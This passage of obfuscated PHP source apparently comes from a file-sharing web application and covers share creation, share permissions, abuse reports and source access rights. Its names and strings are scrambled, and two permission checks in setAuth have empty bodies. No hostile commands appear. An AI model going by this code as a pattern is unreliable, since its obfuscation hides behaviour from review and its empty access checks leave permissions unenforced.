if ($òÊŸ÷ëİ[$§éúË±»[679]] == $§éúË±»[231] && $ìâ®íãÉ[$§éúË±»[679]] == $§éúË±»[91]) { $ÒäÈæí” = $§éúË±»[2139]; } if ($òÊŸ÷ëİ[$§éúË±»[679]] == $§éúË±»[91] && $ìâ®íãÉ[$§éúË±»[679]] == $§éúË±»[231]) { $ÒäÈæí” = $§éúË±»[2142]; } Model($§éúË±»[649])->eventShare($²€ØËş, $ÒäÈæí”); return; } private function _addShareData($íÖ—ïÚú, $ÄÆ¢¼ïŸ = array(), $ü ¨ØŸƒ = false) { $ìÔÉ¦öÎ =& $_SERVER[äô®•½Â]; $şô£¶’’ = $ü ¨ØŸƒ == $ìÔÉ¦öÎ[192] ? 0 : USER_ID; $õĞçª = array($ìÔÉ¦öÎ[502] => $íÖ—ïÚú, $ìÔÉ¦öÎ[1768] => $şô£¶’’); if ($íÖ—ïÚú == 0) { $õĞçª = array($ìÔÉ¦öÎ[2143] => $ÄÆ¢¼ïŸ[$ìÔÉ¦öÎ[1255]], $ìÔÉ¦öÎ[1768] => $şô£¶’’); } if ($İáèÀâ = $this->where($õĞçª)->find()) { return $İáèÀâ[$ìÔÉ¦öÎ[681]]; } if ($íÖ—ïÚú == 0) { $¦äíï´• = array($ìÔÉ¦öÎ[32] => get_path_this($ÄÆ¢¼ïŸ[$ìÔÉ¦öÎ[87]])); } else { $¦äíï´• = Model($ìÔÉ¦öÎ[896])->sourceInfo($íÖ—ïÚú); if (!$¦äíï´•) { return !1; } } if (!$ÄÆ¢¼ïŸ[$ìÔÉ¦öÎ[1664]]) { $ÄÆ¢¼ïŸ[$ìÔÉ¦öÎ[1664]] = $¦äíï´•[$ìÔÉ¦öÎ[32]]; } $Ù“ÄÏ¥ = array($ìÔÉ¦öÎ[1768] => $şô£¶’’, $ìÔÉ¦öÎ[502] => $íÖ—ïÚú, $ìÔÉ¦öÎ[1664] => $ìÔÉ¦öÎ[12], $ìÔÉ¦öÎ[575] => 0, $ìÔÉ¦öÎ[679] => 0, $ìÔÉ¦öÎ[1255] => $ìÔÉ¦öÎ[12], $ìÔÉ¦öÎ[393] => $ìÔÉ¦öÎ[12], $ìÔÉ¦öÎ[961] => $ìÔÉ¦öÎ[12], $ìÔÉ¦öÎ[2144] => 0, $ìÔÉ¦öÎ[2145] => 0, $ìÔÉ¦öÎ[827] => 0, $ìÔÉ¦öÎ[2146] => $ìÔÉ¦öÎ[12], $ìÔÉ¦öÎ[2127] => $ìÔÉ¦öÎ[12]); $ÏÂ‰ü­ = explode($ìÔÉ¦öÎ[50], $ìÔÉ¦öÎ[2147]); foreach ($ÏÂ‰ü­ as $ø¸î£‘š) { if (!isset($ÄÆ¢¼ïŸ[$ø¸î£‘š])) { continue; } $Ù“ÄÏ¥[$ø¸î£‘š] = $ÄÆ¢¼ïŸ[$ø¸î£‘š]; } $÷Àˆ­ªø = $this->add($Ù“ÄÏ¥); $‡¾ö½‘ò = array($ìÔÉ¦öÎ[2127] => short_id($÷Àˆ­ªø)); if ($this->where($‡¾ö½‘ò)->find()) { $‡¾ö½‘ò[$ìÔÉ¦öÎ[2127]] .= $ìÔÉ¦öÎ[473] . rand_string(2, 3); } $this->where(array($ìÔÉ¦öÎ[2148] => $÷Àˆ­ªø))->save($‡¾ö½‘ò); return $÷Àˆ­ªø; } private function _shareAuthSet($Ÿ°·¾üé, $ÒíÑïåî) { $Ò’ÇÂ³³ =& $_SERVER[äô®•½Â]; if (!is_array($ÒíÑïåî)) { return !1; } $Ú¦áÑı€ = Model($Ò’ÇÂ³³[2090]); $Ú¦áÑı€->where(array($Ò’ÇÂ³³[681] => $Ÿ°·¾üé))->delete(); $òä”œ¥è = array(); foreach ($ÒíÑïåî as $°ö²½À†) { $É¨œØØ‡ = SourceModel::TYPE_USER; if ($°ö²½À†[$Ò’ÇÂ³³[191]] == SourceModel::TYPE_GROUP) { $É¨œØØ‡ = SourceModel::TYPE_GROUP; } $öãâï—Ş = array($Ò’ÇÂ³³[681] => $Ÿ°·¾üé, $Ò’ÇÂ³³[191] => $É¨œØØ‡, $Ò’ÇÂ³³[582] => intval($°ö²½À†[$Ò’ÇÂ³³[582]]), $Ò’ÇÂ³³[2086] => 0, $Ò’ÇÂ³³[2149] => -1); if ($°ö²½À†[$Ò’ÇÂ³³[2086]]) { $öãâï—Ş[$Ò’ÇÂ³³[2086]] = $°ö²½À†[$Ò’ÇÂ³³[2086]]; } else { if ($°ö²½À†[$Ò’ÇÂ³³[2149]]) { $öãâï—Ş[$Ò’ÇÂ³³[2149]] = $°ö²½À†[$Ò’ÇÂ³³[2149]]; } } $òä”œ¥è[] = $öãâï—Ş; } return $Ú¦áÑı€->addAll($òä”œ¥è, array(), !0); } public function numViewAdd($ÑÅ²€—) { $ŠîëŒı½ =& $_SERVER[äô®•½Â]; $Äù±’¬Ñ = array($ŠîëŒı½[2148] => $ÑÅ²€—); $this->where($Äù±’¬Ñ)->setAdd($ŠîëŒı½[2144]); } public function numDownloadAdd($È§ÉŸ‡Ú) { $Æ¡ùÀ¸« =& $_SERVER[äô®•½Â]; $Äà½æÒ = array($Æ¡ùÀ¸«[2148] => $È§ÉŸ‡Ú); $this->where($Äà½æÒ)->setAdd($Æ¡ùÀ¸«[2145]); } protected function shareEdit($Ö–¶ğÕ”, $‹­ÀÃ¸è) { $ÎŞóá‡ =& $_SERVER[äô®•½Â]; $„º¸şÜå = $this->getInfo($Ö–¶ğÕ”); if (!$„º¸şÜå) { return !1; } if ($‹­ÀÃ¸è[$ÎŞóá‡[2127]] && $‹­ÀÃ¸è[$ÎŞóá‡[575]] == $ÎŞóá‡[91]) { if ($‹­ÀÃ¸è[$ÎŞóá‡[2127]] == $„º¸şÜå[$ÎŞóá‡[2127]]) { unset($‹­ÀÃ¸è[$ÎŞóá‡[2127]]); } if ($‹­ÀÃ¸è[$ÎŞóá‡[2127]]) { $ê…ø´¾ = $this->where(array($ÎŞóá‡[2150] => $‹­ÀÃ¸è[$ÎŞóá‡[2127]]))->find(); if ($ê…ø´¾) { return !1; } if (!is_array($‹­ÀÃ¸è[$ÎŞóá‡[2146]])) { $‹­ÀÃ¸è[$ÎŞóá‡[2146]] = array(); } if (!$‹­ÀÃ¸è[$ÎŞóá‡[2146]][$ÎŞóá‡[2151]]) { $‹­ÀÃ¸è[$ÎŞóá‡[2146]][$ÎŞóá‡[2151]] = $„º¸şÜå[$ÎŞóá‡[2127]]; $‹­ÀÃ¸è[$ÎŞóá‡[2146]][$ÎŞóá‡[2152]] = $ÎŞóá‡[91]; } } } $this->_checkLinkShare($‹­ÀÃ¸è, $„º¸şÜå); $”ÜœäÒç = array(); $áÙæ¸ = explode($ÎŞóá‡[50], $ÎŞóá‡[2153]); foreach ($áÙæ¸ as $ä½ç€²–) { if (!array_key_exists($ä½ç€²–, $‹­ÀÃ¸è)) { continue; } $”ÜœäÒç[$ä½ç€²–] = $‹­ÀÃ¸è[$ä½ç€²–]; } $this->shareEventAdd($„º¸şÜå[$ÎŞóá‡[194]], $‹­ÀÃ¸è, $ÎŞóá‡[1947]); $this->where(array($ÎŞóá‡[2148] => $Ö–¶ğÕ”))->save($”ÜœäÒç); if (isset($‹­ÀÃ¸è[$ÎŞóá‡[2136]])) { $this->_shareAuthSet($Ö–¶ğÕ”, $‹­ÀÃ¸è[$ÎŞóá‡[2136]]); } return !0; } private function _checkLinkShare($ÀÎÁ“, $½ÙšËÛğ) { $´‹Ã§°ı =& $_SERVER[äô®•½Â]; if ($ÀÎÁ“[$´‹Ã§°ı[575]] != $´‹Ã§°ı[91]) { return; } $àĞš¸È® = $½ÙšËÛğ[$´‹Ã§°ı[90]][$´‹Ã§°ı[194]]; if ($½ÙšËÛğ[$´‹Ã§°ı[90]][$´‹Ã§°ı[33]] != $´‹Ã§°ı[233]) { $Ñ×Üé€ı = $this->_folderReport($àĞš¸È®); if (!$Ñ×Üé€ı) { return; } show_json(LNG($´‹Ã§°ı[2154]) . $´‹Ã§°ı[2155] . $Ñ×Üé€ı, !1); } $µ³úß¸® = Model($´‹Ã§°ı[896])->fileInfoGet($½ÙšËÛğ[$´‹Ã§°ı[90]][$´‹Ã§°ı[194]]); if (!$µ³úß¸®) { return; } $§¤Š ¯¬ = $this->shareFileMeta($µ³úß¸®[$´‹Ã§°ı[554]]); if (isset($§¤Š ¯¬[$´‹Ã§°ı[461]]) && $§¤Š ¯¬[$´‹Ã§°ı[461]] == $´‹Ã§°ı[91]) { show_json(LNG($´‹Ã§°ı[2156]), !1); } } private function _folderReport($â™ìâşÓ) { $ìËæß’Ş =& $_SERVER[äô®•½Â]; $É¢íØØ = array($ìËæß’Ş[554] => array($ìËæß’Ş[1084], 0), $ìËæß’Ş[815] => 3); $½ïÖëÜˆ = Model($ìËæß’Ş[2157])->where($É¢íØØ)->field($ìËæß’Ş[554])->select(); if (!$½ïÖëÜˆ) { return !1; } $½ïÖëÜˆ = array_to_keyvalue($½ïÖëÜˆ, $ìËæß’Ş[12], $ìËæß’Ş[554]); $ß®‡ëÓ» = $ìËæß’Ş[50] . $â™ìâşÓ . $ìËæß’Ş[50]; $É¢íØØ = array($ìËæß’Ş[554] => array($ìËæß’Ş[7], $½ïÖëÜˆ), $ìËæß’Ş[597] => array($ìËæß’Ş[470], "\45{$ß®‡ëÓ»}\x25"), $ìËæß’Ş[516] => 0); $ù–›úÖ­ = Model($ìËæß’Ş[896])->where($É¢íØØ)->field($ìËæß’Ş[2158])->find(); if (!$ù–›úÖ­) { return !1; } $É…åóşè = substr($ù–›úÖ­[$ìËæß’Ş[597]], strpos($ù–›úÖ­[$ìËæß’Ş[597]], $ß®‡ëÓ»)); $É¢íØØ = array($ìËæß’Ş[194] => array($ìËæß’Ş[7], trim($É…åóşè, $ìËæß’Ş[50]))); $™Ê¾ÈÜİ = Model($ìËæß’Ş[896])->where($É¢íØØ)->field($ìËæß’Ş[32])->select(); $Ğ¿ƒèÊ­ = array_to_keyvalue($™Ê¾ÈÜİ, $ìËæß’Ş[12], $ìËæß’Ş[32]); $Ğ¿ƒèÊ­[] = $ù–›úÖ­[$ìËæß’Ş[32]]; return implode($ìËæß’Ş[8], $Ğ¿ƒèÊ­); } protected function remove($©åÆâœ ) { $Åš‹©¨½ =& $_SERVER[äô®•½Â]; $Í¨êªÚ = is_array($©åÆâœ ) ? $©åÆâœ  : array($©åÆâœ ); for ($Õ¡¹Õ = 0; $Õ¡¹Õ < count($Í¨êªÚ); $Õ¡¹Õ++) { $¦Ãç¢¨ = $this->getInfo($Í¨êªÚ[$Õ¡¹Õ]); if ($¦Ãç¢¨[$Åš‹©¨½[679]] == $Åš‹©¨½[91]) { Model($Åš‹©¨½[649])->eventShare($¦Ãç¢¨[$Åš‹©¨½[194]], $Åš‹©¨½[2142]); } if ($¦Ãç¢¨[$Åš‹©¨½[575]] == $Åš‹©¨½[91]) { Model($Åš‹©¨½[649])->eventShare($¦Ãç¢¨[$Åš‹©¨½[194]], $Åš‹©¨½[2141]); } $this->shareInfoMofify($¦Ãç¢¨, $Åš‹©¨½[2126]); } $ã†ä¦éè = array($Åš‹©¨½[681] => array($Åš‹©¨½[7], $Í¨êªÚ)); $ò•¼Í¦ = $this->where($ã†ä¦éè)->delete(); if ($ò•¼Í¦) { Model($Åš‹©¨½[682])->where($ã†ä¦éè)->delete(); } return $ò•¼Í¦; } protected function removeBySource($Ùİ¼©¹) { $ô©Ï¸£· =& $_SERVER[äô®•½Â]; $¾îÍÄ¥œ = array($ô©Ï¸£·[502] => array($ô©Ï¸£·[503], $Ùİ¼©¹)); $ó®ÁÑ‚® = $this->field($ô©Ï¸£·[681])->where($¾îÍÄ¥œ)->select(); $ˆÈ¥¦È» = array_to_keyvalue($ó®ÁÑ‚®, $ô©Ï¸£·[12], $ô©Ï¸£·[681]); if (!$ˆÈ¥¦È») { return; } foreach ($ó®ÁÑ‚® as $¾åò©÷÷) { $this->shareInfoMofify($¾åò©÷÷, $ô©Ï¸£·[2126]); } $¾îÍÄ¥œ = array($ô©Ï¸£·[2148] => array($ô©Ï¸£·[503], $ˆÈ¥¦È»)); $this->where($¾îÍÄ¥œ)->delete(); Model($ô©Ï¸£·[682])->where($¾îÍÄ¥œ)->delete(); } public function listAll($ëÙõˆÜ) { $å ±û‚¦ =& $_SERVER[äô®•½Â]; $¨™Ëèºç = array(); if ($ëÙõˆÜ[$å ±û‚¦[1777]]) { $¨™Ëèºç[$å ±û‚¦[1777]] = $ëÙõˆÜ[$å ±û‚¦[1777]]; } if ($ëÙõˆÜ[$å ±û‚¦[826]]) { $Ê¸ËÁØá = $ëÙõˆÜ[$å ±û‚¦[827]] ? $ëÙõˆÜ[$å ±û‚¦[827]] : strtotime(date($å ±û‚¦[2159])); $¨™Ëèºç[$å ±û‚¦[234]] = array($å ±û‚¦[419], array($ëÙõˆÜ[$å ±û‚¦[826]], $Ê¸ËÁØá)); } if ($ëÙõˆÜ[$å ±û‚¦[33]]) { $¨™Ëèºç[$ëÙõˆÜ[$å ±û‚¦[33]]] = 1; } else { $¨™Ëèºç[] = array($å ±û‚¦[575] => array($å ±û‚¦[1084], 0), $å ±û‚¦[679] => array($å ±û‚¦[1084], 0), $å ±û‚¦[2130] => $å ±û‚¦[2080]); } if ($ëÙõˆÜ[$å ±û‚¦[2076]]) { $¨™Ëèºç[] = array($å ±û‚¦[2127] => $ëÙõˆÜ[$å ±û‚¦[2076]], $å ±û‚¦[1664] => array($å ±û‚¦[470], "\x25{$ëÙõˆÜ[$å ±û‚¦[2076]]}\x25"), $å ±û‚¦[2130] => $å ±û‚¦[2080]); } $Œ¸é—ò = $this->_makeOrder()->where($¨™Ëèºç)->selectPage(20); if (empty($Œ¸é—ò[$å ±û‚¦[456]])) { return array(); } $this->_listDataApply($Œ¸é—ò[$å ±û‚¦[456]]); return $Œ¸é—ò; } public function listDataApply($ÈòÏƒ§¸) { $this->_listDataApply($ÈòÏƒ§¸); return $ÈòÏƒ§¸; } private function _listDataApply(&$õÇú²ï¬) { $±ó¤…¸ =& $_SERVER[äô®•½Â]; $É‹¢‘·Õ = array_to_keyvalue($õÇú²ï¬, $±ó¤…¸[12], $±ó¤…¸[1777]); $¿ƒÇĞš = Model($±ó¤…¸[610])->userListInfo(array_unique($É‹¢‘·Õ)); $ëÖõ…Ù· = array_to_keyvalue($õÇú²ï¬, $±ó¤…¸[12], $±ó¤…¸[194]); $”çĞƒ´“ = Model($±ó¤…¸[896])->sourceListInfo($ëÖõ…Ù·, !0); foreach ($õÇú²ï¬ as $£™¥—ì¼ => &$¨—…ëµ¯) { $Š¤½ô˜½ = $¨—…ëµ¯[$±ó¤…¸[1777]]; $¨—…ëµ¯[$±ó¤…¸[2160]] = $¿ƒÇĞš[$Š¤½ô˜½] ? $¿ƒÇĞš[$Š¤½ô˜½] : !1; if (!$¨—…ëµ¯[$±ó¤…¸[2160]] || $¨—…ëµ¯[$±ó¤…¸[2160]][$±ó¤…¸[815]] != $±ó¤…¸[91]) { unset($õÇú²ï¬[$£™¥—ì¼]); continue; } $ıÒçîĞú = $¨—…ëµ¯[$±ó¤…¸[194]]; $¨—…ëµ¯[$±ó¤…¸[90]] = $”çĞƒ´“[$ıÒçîĞú] ? $”çĞƒ´“[$ıÒçîĞú] : !1; if ($¨—…ëµ¯[$±ó¤…¸[90]][$±ó¤…¸[516]] == $±ó¤…¸[91]) { unset($õÇú²ï¬[$£™¥—ì¼]); } if ($¨—…ëµ¯[$±ó¤…¸[90]] != $±ó¤…¸[231] && !$¨—…ëµ¯[$±ó¤…¸[90]]) { unset($õÇú²ï¬[$£™¥—ì¼]); } } unset($¨—…ëµ¯); $õÇú²ï¬ = array_values($õÇú²ï¬); } private function _makeOrder($Ô”ïù±¦ = '') { $Ë•‰€àñ =& $_SERVER[äô®•½Â]; $ñ¡—ğ… = array($Ë•‰€àñ[234], $Ë•‰€àñ[827], $Ë•‰€àñ[2144], $Ë•‰€àñ[2145]); $Ğ¨íÖåŠ = array($Ë•‰€àñ[534] => $Ë•‰€àñ[535], $Ë•‰€àñ[536] => $Ë•‰€àñ[537]); $™Êİ‘Ü§ = Input::get($Ë•‰€àñ[541], $Ë•‰€àñ[7], $Ë•‰€àñ[508], $ñ¡—ğ…); $¸‹ÈòÀˆ = Input::get($Ë•‰€àñ[542], $Ë•‰€àñ[7], $Ë•‰€àñ[2161], array($Ë•‰€àñ[2073], $Ë•‰€àñ[536])); $¸‹ÈòÀˆ = $Ğ¨íÖåŠ[$¸‹ÈòÀˆ]; $Ô”ïù±¦ = $Ô”ïù±¦ . "{$™Êİ‘Ü§}\40{$¸‹ÈòÀˆ}"; return $this->order($Ô”ïù±¦); } public function reportAdd($¤½ö¿¸) { $£ß·ƒë© =& $_SERVER[äô®•½Â]; $ÓŠ¹‰Â = array($£ß·ƒë©[681] => $¤½ö¿¸[$£ß·ƒë©[681]], $£ß·ƒë©[1777] => USER_ID); if (Model($£ß·ƒë©[2157])->where($ÓŠ¹‰Â)->find()) { return !1; } $ö€øËÉ = array($£ß·ƒë©[681] => $¤½ö¿¸[$£ß·ƒë©[681]], $£ß·ƒë©[1664] => $¤½ö¿¸[$£ß·ƒë©[1664]], $£ß·ƒë©[194] => $¤½ö¿¸[$£ß·ƒë©[194]], $£ß·ƒë©[554] => $¤½ö¿¸[$£ß·ƒë©[554]], $£ß·ƒë©[1777] => USER_ID, $£ß·ƒë©[33] => $¤½ö¿¸[$£ß·ƒë©[33]], $£ß·ƒë©[537] => $¤½ö¿¸[$£ß·ƒë©[537]]); return Model($£ß·ƒë©[2157])->add($ö€øËÉ); } public function reportList($å«ÕÇø‹) { $Ô¾×ƒè¦ =& $_SERVER[äô®•½Â]; $ßÄÕŸÏŸ = array(); if ($å«ÕÇø‹[$Ô¾×ƒè¦[826]]) { $Á£—ÖÁ = $å«ÕÇø‹[$Ô¾×ƒè¦[827]] ? $å«ÕÇø‹[$Ô¾×ƒè¦[827]] : strtotime(date($Ô¾×ƒè¦[2159])); $ßÄÕŸÏŸ[$Ô¾×ƒè¦[234]] = array($Ô¾×ƒè¦[419], array($å«ÕÇø‹[$Ô¾×ƒè¦[826]], $Á£—ÖÁ)); } if (isset($å«ÕÇø‹[$Ô¾×ƒè¦[33]]) && in_array($å«ÕÇø‹[$Ô¾×ƒè¦[33]], array($Ô¾×ƒè¦[91], $Ô¾×ƒè¦[521], $Ô¾×ƒè¦[2162], $Ô¾×ƒè¦[2163], $Ô¾×ƒè¦[2164]))) { $ßÄÕŸÏŸ[$Ô¾×ƒè¦[33]] = $å«ÕÇø‹[$Ô¾×ƒè¦[33]]; } if (isset($å«ÕÇø‹[$Ô¾×ƒè¦[815]]) && in_array($å«ÕÇø‹[$Ô¾×ƒè¦[815]], array($Ô¾×ƒè¦[231], $Ô¾×ƒè¦[91], $Ô¾×ƒè¦[521], $Ô¾×ƒè¦[2162]))) { $ßÄÕŸÏŸ[$Ô¾×ƒè¦[815]] = $å«ÕÇø‹[$Ô¾×ƒè¦[815]]; } $ÍñÛÅó = Input::get($Ô¾×ƒè¦[542], $Ô¾×ƒè¦[7], $Ô¾×ƒè¦[2161], array($Ô¾×ƒè¦[2073], $Ô¾×ƒè¦[536])); $¶éÖùï = array($Ô¾×ƒè¦[534] => $Ô¾×ƒè¦[535], $Ô¾×ƒè¦[536] => $Ô¾×ƒè¦[537]); $È‚ŸÇ¶ğ = $Ô¾×ƒè¦[2165] . $¶éÖùï[$ÍñÛÅó]; $“ÍóƒÄ = Model($Ô¾×ƒè¦[2157])->where($ßÄÕŸÏŸ)->order($È‚ŸÇ¶ğ)->selectPage(20); if (empty($“ÍóƒÄ[$Ô¾×ƒè¦[456]])) { return array(); } $¥ ¨œ• = array_to_keyvalue_group($“ÍóƒÄ[$Ô¾×ƒè¦[456]], $Ô¾×ƒè¦[815], $Ô¾×ƒè¦[681]); if (!empty($¥ ¨œ•[0])) { $å«ÕÇø‹ = $¥ ¨œ•[0]; $ßÄÕŸÏŸ = array($Ô¾×ƒè¦[681] => array($Ô¾×ƒè¦[7], $å«ÕÇø‹)); $Äèú…ÂÍ = $this->where($ßÄÕŸÏŸ)->field($Ô¾×ƒè¦[681])->select(); $Äèú…ÂÍ = array_to_keyvalue($Äèú…ÂÍ, $Ô¾×ƒè¦[12], $Ô¾×ƒè¦[681]); $±¶Æ¯¿» = array_diff($å«ÕÇø‹, $Äèú…ÂÍ); if (!empty($±¶Æ¯¿»)) { foreach ($“ÍóƒÄ[$Ô¾×ƒè¦[456]] as $–åáôøÆ => $´ñëù­”) { if (in_array($´ñëù­”[$Ô¾×ƒè¦[681]], $±¶Æ¯¿»)) { unset($“ÍóƒÄ[$Ô¾×ƒè¦[456]][$–åáôøÆ]); } } } } $this->_listDataApply($“ÍóƒÄ[$Ô¾×ƒè¦[456]]); return $“ÍóƒÄ; } public function reportStatus($´Ã®–ÜÇ) { $¾¥¾®« =& $_SERVER[äô®•½Â]; $Øì’öŠ = array($¾¥¾®«[486] => $´Ã®–ÜÇ[$¾¥¾®«[486]]); $èû÷  = Model($¾¥¾®«[2157])->where($Øì’öŠ)->field($¾¥¾®«[2166])->find(); if (!$èû÷ ) { return !1; } $Ôù˜ó¨· = array($¾¥¾®«[815] => $´Ã®–ÜÇ[$¾¥¾®«[815]]); if ($´Ã®–ÜÇ[$¾¥¾®«[815]] == $¾¥¾®«[2162] && $èû÷ [$¾¥¾®«[815]] == $¾¥¾®«[2162]) { $Ôù˜ó¨·[$¾¥¾®«[815]] = 0; } $³âë©ø¤ = Model($¾¥¾®«[2157])->where($Øì’öŠ)->save($Ôù˜ó¨·); if ($´Ã®–ÜÇ[$¾¥¾®«[815]] == $¾¥¾®«[521]) { if ($èû÷ [$¾¥¾®«[554]] != $¾¥¾®«[231] && $this->shareFileMeta($èû÷ [$¾¥¾®«[554]])) { $this->shareFileMeta($èû÷ [$¾¥¾®«[554]], 0); } $this->remove($èû÷ [$¾¥¾®«[681]]); return !0; } if ($³âë©ø¤ && $´Ã®–ÜÇ[$¾¥¾®«[815]] == $¾¥¾®«[2162]) { $ÅÈËö¾Ü = $Ôù˜ó¨·[$¾¥¾®«[815]] == $¾¥¾®«[2162] ? 1 : 0; $this->shareFileMeta($èû÷ [$¾¥¾®«[554]], $ÅÈËö¾Ü); $this->removeByFile($èû÷ [$¾¥¾®«[554]]); } return $³âë©ø¤; } private function removeByFile($ÒßÒ¡¼Œ) { $ò“´ŸšÏ =& $_SERVER[äô®•½Â]; $ÆµÜ•ò = Model($ò“´ŸšÏ[896])->where(array($ò“´ŸšÏ[554] => $ÒßÒ¡¼Œ))->field($ò“´ŸšÏ[194])->select(); $ÖéÙï… = array_to_keyvalue($ÆµÜ•ò, $ò“´ŸšÏ[12], $ò“´ŸšÏ[194]); $¬°²œÊê = array($ò“´ŸšÏ[194] => array($ò“´ŸšÏ[7], $ÖéÙï…), $ò“´ŸšÏ[575] => 1); $ÆµÜ•ò = $this->where($¬°²œÊê)->field($ò“´ŸšÏ[681])->select(); if (empty($ÆµÜ•ò)) { return; } $í€Ú‹Ñ÷ = array_to_keyvalue($ÆµÜ•ò, $ò“´ŸšÏ[12], $ò“´ŸšÏ[681]); $this->remove($í€Ú‹Ñ÷); } private function shareFileMeta($š‰Íüãœ, $À ’ú› = null) { $Ê½¶ãø¹ =& $_SERVER[äô®•½Â]; $âÅ‹«ª» = array($Ê½¶ãø¹[554] => $š‰Íüãœ, $Ê½¶ãø¹[97] => $Ê½¶ãø¹[2167]); if (is_null($À ’ú›)) { return Model($Ê½¶ãø¹[2168])->where($âÅ‹«ª»)->find(); } $âÅ‹«ª»[$Ê½¶ãø¹[461]] = $À ’ú›; Model($Ê½¶ãø¹[2168])->add($âÅ‹«ª», array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\165\162\143\x65\x5f\x61\165\x74\150"; public function getAuth($³Õó‰°Ï) { $ƒ¿×ÉÙ =& $_SERVER[äô®•½Â]; $ìÉëê´ï = $this->sourceAuthSelect($³Õó‰°Ï); $‡ú‘Ÿóá = array(); $¯Â–ïÇ¥ = array(); $ü”…Ûïš = 2 << 25; foreach ($ìÉëê´ï as $µŠ”ñ”) { $­ÁÕÛ¥’ = Model($ƒ¿×ÉÙ[584])->listData($µŠ”ñ”[$ƒ¿×ÉÙ[2086]]); if (!$­ÁÕÛ¥’) { continue; } $‡ú‘Ÿóá[] = $µŠ”ñ”; $áó·É¬è = 0; if ($µŠ”ñ”[$ƒ¿×ÉÙ[191]] == SourceModel::TYPE_GROUP) { $áó·É¬è = $ü”…Ûïš * 2; } if ($µŠ”ñ”[$ƒ¿×ÉÙ[191]] == SourceModel::TYPE_USER) { $áó·É¬è = $ü”…Ûïš; } if ($µŠ”ñ”[$ƒ¿×ÉÙ[191]] == SourceModel::TYPE_USER && $µŠ”ñ”[$ƒ¿×ÉÙ[582]] == $ƒ¿×ÉÙ[231]) { $áó·É¬è = 0; } $¯Â–ïÇ¥[] = $­ÁÕÛ¥’[$ƒ¿×ÉÙ[498]] + $áó·É¬è; } array_multisort($¯Â–ïÇ¥, SORT_DESC, $‡ú‘Ÿóá); return $‡ú‘Ÿóá; } public function sourceAuthSelect($óå†åòá) { $§¸­ÔùÇ =& $_SERVER[äô®•½Â]; static $Ó§ĞŞÛ… = array(); $”ËĞñ‰… = is_array($óå†åòá) ? !1 : !0; if ($”ËĞñ‰…) { $óå†åòá = array($óå†åòá); } $ŞÃÇÑÇ² = array(); foreach ($óå†åòá as $–î˜ß¢) { if (isset($Ó§ĞŞÛ…[$–î˜ß¢])) { $ŞÃÇÑÇ²[$–î˜ß¢] = $Ó§ĞŞÛ…[$–î˜ß¢]; } } if (count($ŞÃÇÑÇ²) == count($óå†åòá)) { return $”ËĞñ‰… ? $ŞÃÇÑÇ²[$óå†åòá[0]] : $ŞÃÇÑÇ²; } $Ï·÷Óºİ = $§¸­ÔùÇ[2169]; $Ñ«ˆà‰ = array($§¸­ÔùÇ[194] => array($§¸­ÔùÇ[7], $óå†åòá)); $ÈñúªÅ§ = $this->field($Ï·÷Óºİ)->order($§¸­ÔùÇ[486])->where($Ñ«ˆà‰)->select(); $ÃËÀ®‘ = array_to_keyvalue_group($ÈñúªÅ§, $§¸­ÔùÇ[194]); foreach ($óå†åòá as $–î˜ß¢) { $Ó§ĞŞÛ…[$–î˜ß¢] = $ÃËÀ®‘[$–î˜ß¢] ? $ÃËÀ®‘[$–î˜ß¢] : array(); } if ($”ËĞñ‰…) { return $ÈñúªÅ§; } return $ÃËÀ®‘; } public function setAuth($ü €ö¤‚, $¸—¿†ˆ¶) { $ˆ‚¯ôâ =& $_SERVER[äô®•½Â]; $¼³±»éÔ = Model($ˆ‚¯ôâ[1426])->sourceInfo($ü €ö¤‚); if (!$¼³±»éÔ) { return !1; } if ($¼³±»éÔ[$ˆ‚¯ôâ[191]] != SourceModel::TYPE_GROUP) { return !1; } $´ÖËÜüË = 1; $´á™¹Œú = $¼³±»éÔ[$ˆ‚¯ôâ[582]]; if ($´á™¹Œú != $´ÖËÜüË) { $ëÍŸ¿ı = array($ˆ‚¯ôâ[1388] => $´á™¹Œú); $–…êß•º = Model($ˆ‚¯ôâ[2072])->field($ˆ‚¯ôâ[1777])->where($ëÍŸ¿ı)->select(); $–…êß•º = array_to_keyvalue($–…êß•º, $ˆ‚¯ôâ[12], $ˆ‚¯ôâ[1777]); } $”óå­ô = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $¶Ö¥‹ë” = array(); foreach ($¸—¿†ˆ¶ as $ğÙäˆ’£) { if (!in_array($ğÙäˆ’£[$ˆ‚¯ôâ[191]], $”óå­ô)) { show_json(LNG($ˆ‚¯ôâ[2170]), !1); } if ($´á™¹Œú != $´ÖËÜüË) { if ($ğÙäˆ’£[$ˆ‚¯ôâ[191]] == SourceModel::TYPE_GROUP) { } if ($ğÙäˆ’£[$ˆ‚¯ôâ[582]] != 0 && !in_array($ğÙäˆ’£[$ˆ‚¯ôâ[582]], $–…êß•º)) { } } if ($ğÙäˆ’£[$ˆ‚¯ôâ[582]] == 0) { $ğÙäˆ’£[$ˆ‚¯ôâ[191]] = SourceModel::TYPE_USER; } $¶Ö¥‹ë”[] = array($ˆ‚¯ôâ[194] => $ü €ö¤‚, $ˆ‚¯ôâ[191] => intval($ğÙäˆ’£[$ˆ‚¯ôâ[191]]), $ˆ‚¯ôâ[582] => intval($ğÙäˆ’£[$ˆ‚¯ôâ[582]]), $ˆ‚¯ôâ[2086] => intval($ğÙäˆ’£[$ˆ‚¯ôâ[2086]]) ? intval($ğÙäˆ’£[$ˆ‚¯ôâ[2086]]) : 0, $ˆ‚¯ôâ[2149] => intval($ğÙäˆ’£[$ˆ‚¯ôâ[2149]]) ? intval($ğÙäˆ’£[$ˆ‚¯ôâ[2149]]) : -1); } $this->where(array($ˆ‚¯ôâ[502] => $ü €ö¤‚))->delete(); $this->addAll($¶Ö¥‹ë”); return !0; } public function authClear($êßìÏÀò) { $ØöÌÇÏƒ =& $_SERVER[äô®•½Â]; $÷ş¸àæû = Model($ØöÌÇÏƒ[1426])->sourceInfo($êßìÏÀò); $ÙŞÜÅø = array($êßìÏÀò); if ($÷ş¸àæû[$ØöÌÇÏƒ[496]] == $ØöÌÇÏƒ[91]) { $¤ëÂ¸Úİ = array($ØöÌÇÏƒ[668] => array($ØöÌÇÏƒ[628], $÷ş¸àæû[$ØöÌÇÏƒ[597]] . $êßìÏÀò . $ØöÌÇÏƒ[629])); $ÙŞÜÅø = Model($ØöÌÇÏƒ[1426])->field($ØöÌÇÏƒ[502])->where($¤ëÂ¸Úİ)->getField($ØöÌÇÏƒ[194], !0); $ÙŞÜÅø[] = $êßìÏÀò; } 